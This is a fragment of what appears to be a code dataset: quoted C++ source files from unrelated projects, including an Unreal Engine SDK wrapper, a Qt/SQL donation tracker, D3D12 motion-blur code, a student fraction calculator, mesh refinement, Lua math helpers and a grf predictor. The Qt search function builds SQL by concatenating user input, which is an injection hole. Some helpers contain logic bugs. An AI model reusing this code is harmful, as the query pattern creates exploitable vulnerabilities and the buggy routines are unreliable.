NativeAccessSpecifierPublic)\n// class UGameplayTask*               Task                                                             (Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash, NativeAccessSpecifierPublic)\n// uint8                              Priority                                                         (Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash, NativeAccessSpecifierPublic)\n// TArray<TSubclassOf<class UGameplayTaskResource>>AdditionalRequiredResources                                      (Parm, ZeroConstructor, AdvancedDisplay, UObjectWrapper, HasGetValueTypeHash, NativeAccessSpecifierPublic)\n// TArray<TSubclassOf<class UGameplayTaskResource>>AdditionalClaimedResources                                       (Parm, ZeroConstructor, AdvancedDisplay, UObjectWrapper, HasGetValueTypeHash, NativeAccessSpecifierPublic)\n// enum class EGameplayTaskRunResult  ReturnValue                                                      (Parm, OutParm, ZeroConstructor, ReturnParm, IsPlainOldData, NoDestructor, HasGetValueTypeHash, NativeAccessSpecifierPublic)\n\nenum class EGameplayTaskRunResult UGameplayTasksComponent::K2_RunGameplayTask(TScriptInterface<class IGameplayTaskOwnerInterface> TaskOwner, class UGameplayTask* Task, uint8 Priority, const TArray<TSubclassOf<class UGameplayTaskResource>>& AdditionalRequiredResources, const TArray<TSubclassOf<class UGameplayTaskResource>>& AdditionalClaimedResources)\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"GameplayTasksComponent\", \"K2_RunGameplayTask\");\n\n\tParams::UGameplayTasksComponent_K2_RunGameplayTask_Params Parms{};\n\n\tParms.TaskOwner = TaskOwner;\n\tParms.Task = Task;\n\tParms.Priority = Priority;\n\tParms.AdditionalRequiredResources = AdditionalRequiredResources;\n\tParms.AdditionalClaimedResources = AdditionalClaimedResources;\n\n\tauto Flgs = Func->FunctionFlags;\n\tFunc->FunctionFlags |= 0x400;\n\n\tUObject::ProcessEvent(Func, &Parms);\n\n\n\tFunc->FunctionFlags = Flgs;\n\n\treturn Parms.ReturnValue;\n\n}\n\n\n// Class GameplayTasks.GameplayTask\n// (None)\n\nclass UClass* UGameplayTask::StaticClass()\n{\n\tstatic class UClass* Clss = nullptr;\n\n\tif (!Clss)\n\t\tClss = UObject::FindClassFast(\"GameplayTask\");\n\n\treturn Clss;\n}\n\n\n// GameplayTask GameplayTasks.Default__GameplayTask\n// (Public, ClassDefaultObject, ArchetypeObject, StrongRefOnFrame)\n\nclass UGameplayTask* UGameplayTask::GetDefaultObj()\n{\n\tstatic class UGameplayTask* Default = nullptr;\n\n\tif (!Default)\n\t\tDefault = static_cast<UGameplayTask*>(UGameplayTask::StaticClass()->DefaultObject);\n\n\treturn Default;\n}\n\n\n// Function GameplayTasks.GameplayTask.ReadyForActivation\n// (Final, Native, Public, BlueprintCallable)\n// Parameters:\n\nvoid UGameplayTask::ReadyForActivation()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"GameplayTask\", \"ReadyForActivation\");\n\n\n\n\tauto Flgs = Func->FunctionFlags;\n\tFunc->FunctionFlags |= 0x400;\n\n\tUObject::ProcessEvent(Func, nullptr);\n\n\n\tFunc->FunctionFlags = Flgs;\n\n}\n\n\n// DelegateFunction GameplayTasks.GameplayTask.GenericGameplayTaskDelegate__DelegateSignature\n// (MulticastDelegate, Public, Delegate)\n// Parameters:\n\nvoid UGameplayTask::GenericGameplayTaskDelegate__DelegateSignature()",
    "#include \"aides.h\"\n#include \"mainwindow.h\"\n#include \"connection.h\"\n#include \"ui_mainwindow.h\"\n#include <QtCharts/QChartView>\n#include \"QDebug\"\n#include <QApplication>\n#include <QUrl>\n#include <QDesktopServices>\n\nAides::Aides(int ID_aide, int ID_res, QString description_aide, QString date_aide, QString type_aide, QString donneur)\n{\n    this->ID_aide = ID_aide;\n    this->ID_res = ID_res;\n    this->description_aide = description_aide;\n    this->date_aide = date_aide;\n    this->type_aide = type_aide;\n    this->donneur = donneur;\n}\n\nbool Aides::ajouter()\n{\n\n    QSqlQuery query;\n\n    query.prepare(\"INSERT INTO AIDE (ID_RES, DESCRIPTION_AIDE,DATE_AIDE,TYPE_AIDE, DONNEUR)\"\n                  \"VALUES(:ID_RES,:DESCRIPTION_AIDE,:DATE_AIDE,:TYPE_AIDE,:DONNEUR)\");\n\n    query.bindValue(\":ID_RES\", ID_res);\n    query.bindValue(\":DESCRIPTION_AIDE\", description_aide);\n    query.bindValue(\":DATE_AIDE\", date_aide);\n    query.bindValue(\":TYPE_AIDE\", type_aide);\n    query.bindValue(\":DONNEUR\", donneur);\n    return query.exec();\n}\n\nbool Aides::supprimer(int i)\n{\n\n    QSqlQuery query;\n\n    query.prepare(\"DELETE from AIDE where ID_aide=:id\");\n    query.bindValue(\":id\", i);\n    return query.exec();\n}\n\nQSqlQueryModel *Aides ::afficher()\n{\n    QSqlQueryModel *model = new QSqlQueryModel();\n    model->setQuery(\"SELECT * FROM AIDE\");\n    model->setHeaderData(0, Qt::Horizontal, QObject::tr(\"ID \"));\n    model->setHeaderData(1, Qt::Horizontal, QObject::tr(\"ID Restaurant\"));\n    model->setHeaderData(2, Qt::Horizontal, QObject::tr(\"Description\"));\n    model->setHeaderData(3, Qt::Horizontal, QObject::tr(\"Date\"));\n    model->setHeaderData(4, Qt::Horizontal, QObject::tr(\"Type\"));\n    model->setHeaderData(5, Qt::Horizontal, QObject::tr(\"Donor\"));\n\n    return model;\n}\n\nbool Aides::modifier(int ID)\n{\n    QSqlQuery query;\n    query.prepare(\"UPDATE AIDE SET DESCRIPTION_AIDE=:description,DATE_AIDE=:date,TYPE_AIDE=:type,DONNEUR=:donneur where ID_AIDE=:id\");\n    query.bindValue(\":id\", ID);\n    query.bindValue(\":description\", description_aide);\n    query.bindValue(\":date\", date_aide);\n    query.bindValue(\":donneur\", donneur);\n    query.bindValue(\":type\", type_aide);\n    return query.exec();\n}\n\nQChartView *Aides::stat_type()\n{\n    int aliment = 0;\n    int vetement = 0;\n    int argent = 0;\n\n    QSqlQuery query;\n    query.prepare(\"select * from AIDE where TYPE_AIDE='aliment'\");\n    query.exec();\n    while (query.next())\n        aliment++;\n\n    query.prepare(\"select * from AIDE where TYPE_AIDE='vetements'\");\n    query.exec();\n    while (query.next())\n        vetement++;\n\n    query.prepare(\"select * from AIDE where TYPE_AIDE='argent'\");\n    query.exec();\n    while (query.next())\n        argent++;\n\n    qDebug() << aliment << vetement << argent;\n\n    QPieSeries *series = new QPieSeries();\n    series->append(\"aliment\", aliment);\n    series->append(\"vetement\", vetement);\n    series->append(\"argent\", argent);\n\n    QPieSlice *slice = series->slices().at(0);\n    slice->setExploded(true);\n    slice->setColor(\"#ffc0cb\");\n    QPieSlice *slice2 = series->slices().at(1);\n    slice2->setColor(\"#00FFFF\");\n\n    QPieSlice *slice3 = series->slices().at(2);\n    slice3->setColor(\"#ffd700\");\n\n    QChart *chart = new QChart();\n    chart->addSeries(series);\n    chart->setTitle(\"type statistics\");\n\n    series->setLabelsVisible();\n\n    QChartView *chartView = new QChartView(chart);\n    chartView->setRenderHint(QPainter::Antialiasing);\n    chartView->chart()->setAnimationOptions(QChart::AllAnimations);\n    chartView->chart()->legend()->hide();\n    return chartView;\n}\n\nQSqlQueryModel *Aides::chercher(QString critere)\n{\n    QSqlQueryModel *model = new QSqlQueryModel();\n    model->setQuery(\"SELECT * FROM AIDE WHERE TYPE_AIDE LIKE '\" + critere + \"%'\");\n    model->setHeaderData(0, Qt::Horizontal, QObject::tr(\"ID \"));\n    model->setHeaderData(1, Qt::Horizontal, QObject::tr(\"ID Restaurant\"));\n    model->setHeaderData(2, Qt::Horizontal, QObject::tr(\"Description\"));\n    model->setHeaderData(3, Qt::Horizontal, QObject::tr(\"Date\"));\n    model->setHeaderData(4, Qt::Horizontal, QObject::tr(\"Type\"));\n    model->setHeaderData(5, Qt::Horizontal, QObject::tr(\"Donor\"));\n    return model;\n}\n\nvoid generateQRCode(QString code)\n{\n    QString url = QString(\"https://chart.googleapis.com/chart?cht=qr&chs=300x300&chl=%1\").arg(code);\n\n    QDesktopServices::openUrl(QUrl(url));\n}\n\nvoid Aides::notification(Ui::MainWindow *ui)\n{\n\n    QLabel *notif = ui->stackedWidget_2->findChild<QLabel *>(\"notif_money\");\n    QPushButton *money_btn = ui->stackedWidget_2->findChild<QPushButton *>(\"money_btn\");\n    QLabel *notif1 = ui->stackedWidget_2->findChild<QLabel *>(\"notif_dress\");\n    QPushButton *vete_btn = ui->stackedWidget_2->findChild<QPushButton *>(\"dress_btn\");\n    QLabel *notif2 = ui->stackedWidget_2->findChild<QLabel *>(\"notif_food\");\n    QPushButton *alim_btn = ui->stackedWidget_2->findChild<QPushButton *>(\"food_btn\");\n\n    alim_btn->hide();\n    vete_btn->hide();\n    money_btn->hide();\n\n    QSqlQuery query(\"SELECT COU",
    "#include \"MotionBlurGenerator.hpp\"\n\n#include <format>\n#include <random>\n\n#include \"ErrorHandling.hpp\"\n#include \"Gpu/GpuCommandList.hpp\"\n#include \"Gpu/GpuResourceViews.hpp\"\n\n#include \"CompiledShaders/MotionBlurGatherCs.h\"\n#include \"CompiledShaders/MotionBlurNeighborMaxCs.h\"\n#include \"CompiledShaders/Nv12ToRgbCs.h\"\n#include \"CompiledShaders/OverlayMotionVectorCs.h\"\n#include \"CompiledShaders/RgbToNv12Cs.h\"\n\nusing namespace DirectX;\n\nnamespace\n{\n    constexpr uint32_t DivUp(uint32_t a, uint32_t b) noexcept\n    {\n        return (a + b - 1) / b;\n    }\n\n    D3D12_ROOT_PARAMETER CreateRootParameterAsDescriptorTable(const D3D12_DESCRIPTOR_RANGE* descriptor_ranges,\n        uint32_t num_descriptor_ranges, D3D12_SHADER_VISIBILITY visibility = D3D12_SHADER_VISIBILITY_ALL) noexcept\n    {\n        D3D12_ROOT_PARAMETER ret;\n        ret.ParameterType = D3D12_ROOT_PARAMETER_TYPE_DESCRIPTOR_TABLE;\n        ret.DescriptorTable.NumDescriptorRanges = num_descriptor_ranges;\n        ret.DescriptorTable.pDescriptorRanges = descriptor_ranges;\n        ret.ShaderVisibility = visibility;\n        return ret;\n    }\n\n    D3D12_ROOT_PARAMETER CreateRootParameterAsConstantBufferView(\n        uint32_t shader_register, uint32_t register_space = 0, D3D12_SHADER_VISIBILITY visibility = D3D12_SHADER_VISIBILITY_ALL) noexcept\n    {\n        D3D12_ROOT_PARAMETER ret;\n        ret.ParameterType = D3D12_ROOT_PARAMETER_TYPE_CBV;\n        ret.Descriptor.ShaderRegister = shader_register;\n        ret.Descriptor.RegisterSpace = register_space;\n        ret.ShaderVisibility = visibility;\n        return ret;\n    }\n} // namespace\n\nnamespace MotionToGo\n{\n    MotionBlurGenerator::MotionBlurGenerator(GpuSystem& gpu_system) : gpu_system_(gpu_system)\n    {\n        winrt::com_ptr<ID3D12Device> d3d12_device;\n        d3d12_device.copy_from(gpu_system_.NativeDevice());\n\n        {\n            winrt::com_ptr<ID3D12VideoDevice1> video_device = d3d12_device.try_as<ID3D12VideoDevice1>();\n            if (!video_device)\n            {\n                ::OutputDebugStringW(L\"ERROR: COULDN'T get video device.\\n\");\n                return;\n            }\n\n            D3D12_FEATURE_DATA_VIDEO_MOTION_ESTIMATOR motion_estimator_support{0, DXGI_FORMAT_NV12};\n            TIFHR(video_device->CheckFeatureSupport(\n                D3D12_FEATURE_VIDEO_MOTION_ESTIMATOR, &motion_estimator_support, sizeof(motion_estimator_support)));\n\n            constexpr uint32_t MaxMvWidth = 1920;\n            constexpr uint32_t MaxMvHeight = 1080;\n            constexpr uint32_t MinMvWidth = 512;\n            constexpr uint32_t MinMvHeight = 384;\n            max_mv_width_ = std::min(MaxMvWidth, motion_estimator_support.SizeRange.MaxWidth);\n            max_mv_height_ = std::min(MaxMvHeight, motion_estimator_support.SizeRange.MaxWidth);\n            min_mv_width_ = std::max(MinMvWidth, motion_estimator_support.SizeRange.MinWidth);\n            min_mv_height_ = std::max(MinMvHeight, motion_estimator_support.SizeRange.MinWidth);\n\n            D3D12_VIDEO_MOTION_ESTIMATOR_SEARCH_BLOCK_SIZE block_size;\n            if (motion_estimator_support.BlockSizeFlags & D3D12_VIDEO_MOTION_ESTIMATOR_SEARCH_BLOCK_SIZE_FLAG_16X16)\n            {\n                block_size = D3D12_VIDEO_MOTION_ESTIMATOR_SEARCH_BLOCK_SIZE_16X16;\n                mv_block_size_ = 16;\n            }\n            else\n            {\n                block_size = D3D12_VIDEO_MOTION_ESTIMATOR_SEARCH_BLOCK_SIZE_8X8;\n                mv_block_size_ = 8;\n            }\n\n            const D3D12_VIDEO_MOTION_ESTIMATOR_DESC motion_estimator_desc = {0, DXGI_FORMAT_NV12, block_size,\n                D3D12_VIDEO_MOTION_ESTIMATOR_VECTOR_PRECISION_QUARTER_PEL, {max_mv_width_, max_mv_height_, min_mv_width_, min_mv_height_}};\n            if (FAILED(video_device->CreateVideoMotionEstimator(\n                    &motion_estimator_desc, nullptr, winrt::guid_of<ID3D12VideoMotionEstimator>(), video_motion_estimator_.put_void())))\n            {\n                ::OutputDebugStringW(L\"ERROR: COULDN'T create motion estimator.\\n\");\n                return;\n            }\n\n            const D3D12_VIDEO_MOTION_VECTOR_HEAP_DESC motion_vector_heap_desc = {motion_estimator_desc.NodeMask,\n                motion_estimator_desc.InputFormat, motion_estimator_desc.BlockSize, motion_estimator_desc.Precision,\n                motion_estimator_desc.SizeRange};\n            for (auto& frame : frames_)\n            {\n                if (FAILED(video_device->CreateVideoMotionVectorHeap(&motion_vector_heap_desc, nullptr,\n                        winrt::guid_of<ID3D12VideoMotionVectorHeap>(), frame.video_motion_vector_heap.put_void())))\n                {\n                    ::OutputDebugStringW(L\"ERROR: COULDN'T create motion vector heap.\\n\");\n                    return;\n                }\n            }\n        }\n\n        D3D12_STATIC_SAMPLER_DESC sampler_desc[2];\n        for (uint32_t i = 0; i < std::size(sampler_desc); ++i)\n        {\n            sampler_desc[i] = {};\n            sampler_desc[i].Filter = i == 0 ? D3D",
    "////program name : FCAI-Cairo University Fraction Calculator\n// Program Description: Calculator that is able to add, subtract, multiply and divide fractions\n\n// Author1 and ID and Group: Youssef Amgad Abd Al Halim Ahmed, Testing and regex pattern\n\n// Author2 and ID and Group: Mohamed Ahmed Mohamed Abd El_wahab, Mathematical Calculations\n\n// Author3 and ID and Group: Amr Khaled Ahmed Abd ElHamid, divided the regex pattern into three parts(operator, fraction 1 , fraction 2), created if statement for the mathematical calculations\n\n\n#include <iostream>\n#include <regex>\n# include <cctype>\n# include <string>\n# include <cstring>\n# include <algorithm>\n# include <vector>\n\nusing namespace std;\n\nbool is_valid(string format);\nstring operation(string equation);\npair<long long, long long> extract_fraction(string temp_fraction);\nstring addition_fraction(long long num_fraction1,long long deno_fraction1,long long num_fraction2,long long deno_fraction2);\nstring subtraction_fraction(long long num_fraction1,long long deno_fraction1,long long num_fraction2,long long deno_fraction2);\nstring multiplcation_fraction(long long num_fraction1,long long deno_fraction1,long long num_fraction2,long long deno_fraction2);\nstring division_fraction(long long num_fraction1,long long deno_fraction1,long long num_fraction2,long long deno_fraction2);\npair<long long,long long> common_divisor(long long numerator,long long denominator);\n\n\nint main() {\n\n    cout << \"Welcome to our fractional calculator\" << endl;\n\n    while(true){\n        string format;\n        string choice;\n\n        // display menu and take input from user and take choice from user\n        cout << \"1. Enter an input\" << endl;\n        cout << \"2. Exit\" << endl;\n        cout << \"Choose 1 or 2\" << endl;\n        cin >> choice;\n\n        // validate choice\n        while (true) {\n            if (choice == \"1\")break;\n            else if (choice == \"2\") {\n                cout << \"Thanks for using our fractional calculator\" << endl;\n                return 0;\n            } else {\n                cout << \"Invalid input, please enter a valid choice\" << endl;\n                cin >> choice;\n            }\n        }\n\n        // get calculation from user\n        cin.ignore();\n        cout << \"Please enter your calculation\" << endl;\n        getline(cin, format);\n\n        // make sure format isn't empty\n        while (format.empty()) {\n            cout << \"Invalid input\" << endl;\n            cout << \"Enter a valid input format\" << endl;\n            getline(cin, format);\n        }\n\n        // make sure format matches calculation format\n        bool is_valid_format = is_valid(format);\n\n        while (!is_valid_format) {\n            cout << \"Invalid input\" << endl;\n            cout << \"Enter a valid input format\"<<endl;;\n            getline(cin, format);\n            is_valid_format = is_valid(format);\n        }\n        operation(format);\n    }\n\n}\n\n\nstring operation(string equation) {\n    double result_D;\n    regex N(\"-\");\n    regex Multi(\"\\\\\"); // Escaping '' since it's a special character in regex\n    regex Divide (\"/\");\n    smatch matches;\n\n    // here I will define the equation form divided into parts then take every part as (fraction_1, operation, fraction_2) the perform the equation\n    regex equation_form(\"[ ]?([+-]?[0-9]+(?:/[0]?+[1-9][0-9])?)\\\\s([-+/])\\\\s([+-]?[0-9]+(?:/[0]?+[1-9][0-9])?)[ ]*?\");\n    regex_match(equation, matches, equation_form);\n    string fraction_1 = matches[1].str();\n    string operation = matches[2].str();\n    string fraction_2 = matches[3].str();\n    // by operation choose the operation\n\n    pair<long long, long long> fraction = extract_fraction(fraction_1);\n    pair<long long, long long> fraction2 = extract_fraction(fraction_2);\n\n    if (operation == \"+\"){\n        cout << \"Addition\" << endl;\n        addition_fraction(fraction.first,fraction.second,fraction2.first,fraction2.second);\n\n    }\n    else if (operation == \"-\"){\n        cout << \"Subtraction\" << endl;\n        subtraction_fraction(fraction.first,fraction.second,fraction2.first,fraction2.second);\n\n    }\n    else if (operation == \"/\"){\n        cout << \"Divide\" << endl;\n        division_fraction(fraction.first,fraction.second,fraction2.first,fraction2.second);\n\n    }\n    else if (operation == \"*\"){\n        cout << \"multiplies\" << endl;\n        multiplcation_fraction(fraction.first,fraction.second,fraction2.first,fraction2.second);\n\n    }\n\n    // Return some value since the function is declared to return a string\n    return \"Operation performed successfully\";\n}\n\n\n// function that checks if the format the user entered is correct and valid\nbool is_valid(string format) {\n    if (regex_match(format, regex(\"[ ]?[+-]?[0-9]+(?:/[0]?+[1-9][0-9])?\\\\s[-/+]\\\\s[+-]?[0-9]+(?:/[0]?+[1-9][0-9])?[ ]*?\"))) {\n        return true;\n    } else {\n        return false;\n    }\n}\n\n\npair<long long, long long> extract_fraction(string temp_fraction) {\n    long long sign = 1;\n    string fraction = temp_fraction;\n    if (fraction[0] == '-') {\n        ",
    "//#define Check_Flip_Tets\n#include <mtet/mtet.h>\n#include <mtet/io.h>\n#include <ankerl/unordered_dense.h>\n#include <span>\n#include <queue>\n#include <optional>\n#include <SmallVector.h>\n\n#include <implicit_functions.h>\n#include <subdivide_multi.h>\n#include <CLI/CLI.hpp>\n#include <tet_quality.h>\n#include <timer.h>\n#include <grid_mesh.h>\n\n\nusing namespace mtet;\n\nbool save_mesh_json(const std::string& filename,\n                    const mtet::MTetMesh mesh)\n{\n    vector<array<double, 3>> vertices((int)mesh.get_num_vertices());\n    vector<array<size_t, 4>> tets((int)mesh.get_num_tets());\n    using IndexMap = ankerl::unordered_dense::map<uint64_t, size_t>;\n    IndexMap vertex_tag_map;\n    vertex_tag_map.reserve(mesh.get_num_vertices());\n    int counter = 0;\n    mesh.seq_foreach_vertex([&](VertexId vid, std::span<const Scalar, 3> data){\n        size_t vertex_tag = vertex_tag_map.size() + 1;\n        vertex_tag_map[value_of(vid)] = vertex_tag;\n        vertices[counter] = {data[0], data[1], data[2]};\n        counter ++;\n    });\n    counter = 0;\n    mesh.seq_foreach_tet([&](TetId, std::span<const VertexId, 4> data) {\n        tets[counter] = {vertex_tag_map[value_of(data[0])] - 1, vertex_tag_map[value_of(data[1])] - 1, vertex_tag_map[value_of(data[2])] - 1, vertex_tag_map[value_of(data[3])] - 1};\n        counter ++;\n    });\n    if (std::filesystem::exists(filename.c_str())){\n        std::filesystem::remove(filename.c_str());\n    }\n    using json = nlohmann::json;\n    std::ofstream fout(filename.c_str(),std::ios::app);\n    json jOut;\n    jOut.push_back(json(vertices));\n    jOut.push_back(json(tets));\n    fout << jOut.dump(4, ' ', true, json::error_handler_t::replace) << std::endl;\n    fout.close();\n    return true;\n}\n\nbool save_function_json(const std::string& filename,\n                        const mtet::MTetMesh mesh,\n                        ankerl::unordered_dense::map<uint64_t, llvm_vecsmall::SmallVector<std::array<double, 4>, 20>> vertex_func_grad_map,\n                        const size_t funcNum)\n{\n    vector<vector<double>> values(funcNum);\n    for (size_t funcIter = 0; funcIter <  funcNum; funcIter++){\n        values[funcIter].reserve(((int)mesh.get_num_vertices()));\n    }\n    mesh.seq_foreach_vertex([&](VertexId vid, std::span<const Scalar, 3> data){\n        llvm_vecsmall::SmallVector<std::array<double, 4>, 20> func_gradList(funcNum);\n        func_gradList = vertex_func_grad_map[value_of(vid)];\n        for (size_t funcIter = 0; funcIter < funcNum; funcIter++){\n            cout << data[0] << \" \" << data[1] << \" \" << data[2] << \": \" << func_gradList[funcIter][0] << \", \" << func_gradList[funcIter][1] << \", \" << func_gradList[funcIter][2] << \", \" << func_gradList[funcIter][3] << endl;\n            values[funcIter].push_back(func_gradList[funcIter][0]);\n        }\n    });\n    if (std::filesystem::exists(filename.c_str())){\n        std::filesystem::remove(filename.c_str());\n    }\n    using json = nlohmann::json;\n    std::ofstream fout(filename.c_str(),std::ios::app);\n    json jOut;\n    for (size_t funcIter = 0; funcIter <  funcNum; funcIter++){\n        json jFunc;\n        jFunc[\"type\"] = \"customized\";\n        jFunc[\"value\"] = values[funcIter];\n        jOut.push_back(jFunc);\n    }\n    fout << jOut.dump(4, ' ', true, json::error_handler_t::replace) << std::endl;\n    fout.close();\n    return true;\n}\n//hash for mounting a boolean that represents the activeness to a tet\n//since the tetid isn't const during the process, mount the boolean using vertexids of 4 corners.\nuint64_t vertexHash(std::span<VertexId, 4>& x)\n{\n    ankerl::unordered_dense::hash<uint64_t> hash_fn;\n    return hash_fn(value_of(x[0])) + hash_fn(value_of(x[1])) + hash_fn(value_of(x[2])) + hash_fn(value_of(x[3]));\n}\n\nint main(int argc, const char *argv[])\n{\n    struct\n    {\n        string mesh_file;\n        string function_file;\n        double threshold = 0.0001;\n        double alpha = std::numeric_limits<double>::infinity();\n        int max_elements = -1;\n        double smallest_edge_length = 0;\n        string method = \"IA\";\n        string csg_file;\n        bool bfs = false;\n        bool dfs = false;\n        bool curve_network = false;\n        //bool analysis_mode = false;\n    } args;\n    CLI::App app{\"Longest Edge Bisection Refinement\"};\n    app.add_option(\"mesh\", args.mesh_file, \"Initial mesh file\")->required();\n    app.add_option(\"function\", args.function_file, \"Implicit function file\")->required();\n    app.add_option(\"-t,--threshold\", args.threshold, \"Threshold value\");\n    app.add_option(\"-a,--alpha\", args.alpha, \"Alpha value\");\n    app.add_option(\"-o,--option\", args.method, \"Options of implicit manifold\");\n    app.add_option(\"--tree\", args.csg_file, \"CSG Tree file\");\n    app.add_option(\"-m,--max-elements\", args.max_elements, \"Maximum number of elements\");\n    app.add_option(\"-s,--shortest-edge\", args.smallest_edge_length, \"Shortest edge length\");\n    app.add_option(\"-b, --bfs\", args.bfs, \"Toggle BFS Mode\");\n    app.add_option(\"-d, --dfs\", args.dfs, \"Togg",
    "/*********************************************\n// Created by m1556 on 2024/4/13 19:47.\n*********************************************/\n#include <cmath>\n#include <stdexcept>\n\n#include \"lua_math.h\"\n\n\n\nbool convertToBoolean(Lua_type *val){\n    switch (val->get_type()) {\n        case Lua_type::Kind::Nil:{\n            return false;\n        }\n        case Lua_type::Kind::Boolean:{\n            return val->as<bool>()->get_value();\n        }\n        default:{\n            return true;\n        }\n    }\n}\n\nlong long IFloorDiv(long long a, long long b){\n    if ((a > 0 && b > 0) || (a < 0 && b < 0) || a % b == 0){\n        return a / b;\n    } else {\n        return a / b - 1;\n    }\n}\n\ndouble FFloorDiv(double a, double b){\n    return floor(a / b);\n}\n\nlong long IMod(long long a, long long b){\n    return a - IFloorDiv(a, b) * b;\n}\n\ndouble FMod(double a, double b){\n    return a - floor(a / b) * b;\n}\n\nlong long ShiftLeft(long long a, long long n){\n    if (n >= 0){\n        return a << n;\n    } else {\n        return ShiftRight(a, -n);\n    }\n}\n\nlong long ShiftRight(long long a, long long n){\n    if (n >= 0){\n        return a >> n;\n    } else {\n        return ShiftLeft(a, -n);\n    }\n}\n\nlong long FloatToInteger(double f, bool &flag){\n    auto ret = (long long) f;\n    flag = ((double) ret) == f;\n    return ret;\n}\n\nlong long ParseInteger(std::string str, bool &flag){\n    long long val = 0;\n    try {\n        val = std::stoll(str);\n    } catch (const std::invalid_argument& e){\n        flag = false;\n        return 0;\n    } catch (const std::out_of_range& e){\n        flag = false;\n        return 0;\n    } catch (...){\n        flag = false;\n        return 0;\n    }\n    flag = true;\n    return val;\n}\n\ndouble ParseFloat(std::string str, bool &flag){\n    double val = 0;\n    try {\n        val = std::stod(str);\n    } catch (const std::invalid_argument& e){\n        flag = false;\n        return 0;\n    } catch (const std::out_of_range& e){\n        flag = false;\n        return 0;\n    } catch (...){\n        flag = false;\n        return 0;\n    }\n    flag = true;\n    return val;\n}\n\ndouble convertToFloat(Lua_type *val, bool &flag){\n    switch (val->get_type()) {\n        case Lua_type::Kind::Number:{\n            flag = true;\n            return val->as<double>()->get_value();\n        }\n        case Lua_type::Kind::Integer:{\n            flag = true;\n            return (double) val->as<long long>()->get_value();\n        }\n        case Lua_type::Kind::String:{\n            return ParseFloat(val->as<std::string>()->get_value(), flag);\n        }\n        case Lua_type::Kind::Boolean:{\n            return val->as<bool>()->get_value();\n        }\n        default:{\n            flag = false;\n            return 0;\n        }\n    }\n}\n\nlong long convertToInteger(Lua_type *val, bool &flag) {\n    switch (val->get_type()) {\n        case Lua_type::Kind::Integer: {\n            flag = true;\n            return val->as<long long>()->get_value();\n        }\n        case Lua_type::Kind::Number: {\n            return FloatToInteger(\n                    val->as<double>()->get_value(),\n                    flag\n                    );\n        }\n        case Lua_type::Kind::String: {\n            return stringToInteger_(\n                    val->as<std::string>()->get_value(),\n                    flag\n                    );\n        }\n        default: {\n            flag = false;\n            return 0;\n        }\n    }\n}\n\nlong long stringToInteger_(std::string str, bool &flag) {\n     bool f_val = false;\n     long long val = ParseInteger(str, f_val);\n     if (f_val) {\n         flag = true;\n         return val;\n     }\n\n     double d_value = ParseInteger(str, f_val);\n    if (f_val) {\n        flag = true;\n        return (long long)d_value;\n    }\n    flag = false;\n\n    return 0;\n}",
    "/*-------------------------------------------------------------------------------\n  This file is part of generalized random forest (grf).\n\n  grf is free software: you can redistribute it and/or modify\n  it under the terms of the GNU General Public License as published by\n  the Free Software Foundation, either version 3 of the License, or\n  (at your option) any later version.\n\n  grf is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n  GNU General Public License for more details.\n\n  You should have received a copy of the GNU General Public License\n  along with grf. If not, see <http://www.gnu.org/licenses/>.\n #-------------------------------------------------------------------------------*/\n\n#include \"prediction/MultiRegressionPredictionStrategy.h\"\n\n#include \"Eigen/Dense\"\n\nnamespace grf {\n\nMultiRegressionPredictionStrategy::MultiRegressionPredictionStrategy(size_t num_outcomes) {\n  this->num_outcomes = num_outcomes;\n  this->num_types = 1 + num_outcomes;\n  this->weight_index = num_outcomes;\n}\n\nsize_t MultiRegressionPredictionStrategy::prediction_length() const {\n  return num_outcomes;\n}\n\nstd::vector<double> MultiRegressionPredictionStrategy::predict(const std::vector<double>& average) const {\n  std::vector<double> predictions;\n  predictions.reserve(num_outcomes);\n  double weight_bar = average[weight_index];\n  for (size_t j = 0; j < num_outcomes; j++) {\n    predictions.push_back(average[j] / weight_bar);\n  }\n\n  return predictions;\n}\n\nstd::vector<double> MultiRegressionPredictionStrategy::compute_variance(\n    const std::vector<double>& average,\n    const PredictionValues& leaf_values,\n    size_t ci_group_size) const {\n  return { 0.0 };\n}\n\nsize_t MultiRegressionPredictionStrategy::prediction_value_length() const {\n  return num_types;\n}\n\nPredictionValues MultiRegressionPredictionStrategy::precompute_prediction_values(\n    const std::vector<std::vector<size_t>>& leaf_samples,\n    const Data& data) const {\n  size_t num_leaves = leaf_samples.size();\n  std::vector<std::vector<double>> values(num_leaves);\n\n  for (size_t i = 0; i < num_leaves; i++) {\n    const std::vector<size_t>& leaf_node = leaf_samples.at(i);\n    size_t num_samples = leaf_node.size();\n    if (num_samples == 0) {\n      continue;\n    }\n\n    Eigen::VectorXd sum = Eigen::VectorXd::Zero(num_outcomes);\n    double sum_weight = 0.0;\n    for (auto& sample : leaf_node) {\n      double weight = data.get_weight(sample);\n      sum += weight * data.get_outcomes(sample);\n      sum_weight += weight;\n    }\n    // if total weight is very small, treat the leaf as empty\n    if (std::abs(sum_weight) <= 1e-16) {\n      continue;\n    }\n\n    // store sufficient statistics in order\n    // {outcome_1, ..., outcome_M, weight_sum}\n    std::vector<double>& value = values[i];\n    value.reserve(num_types);\n    for (size_t j = 0; j < num_outcomes; j++) {\n      value.push_back(sum[j] / num_samples);\n    }\n    value.push_back(sum_weight / num_samples);\n  }\n\n  return PredictionValues(values, num_types);\n}\n\nstd::vector<std::pair<double, double>> MultiRegressionPredictionStrategy::compute_error(\n    size_t sample,\n    const std::vector<double>& average,\n    const PredictionValues& leaf_values,\n    const Data& data) const {\n  return { std::make_pair<double, double>(NAN, NAN) };\n}\n\n} // namespace grf\n",
